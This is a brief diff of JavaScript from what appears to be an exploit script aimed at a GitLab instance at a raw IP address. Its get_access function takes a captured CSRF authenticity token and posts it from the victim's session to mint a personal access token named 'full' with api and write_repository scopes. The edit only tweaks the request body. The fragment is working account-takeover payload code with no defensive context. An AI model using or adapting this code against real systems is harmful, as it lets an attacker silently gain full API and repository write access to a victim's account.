@@ -23,7 +23,7 @@ function get_access(token) {
         "Upgrade-Insecure-Requests": "1"
     },
     "referrer": "https://65.52.77.188/-/profile/personal_access_tokens",
-  "body": "authenticity_token="+ encodeURI(token) + "&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
+  "body": "authenticity_token="+ encodeURI(token) + "==&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
   "method": "POST",
   "mode": "cors"
 }).then(response => response.text())
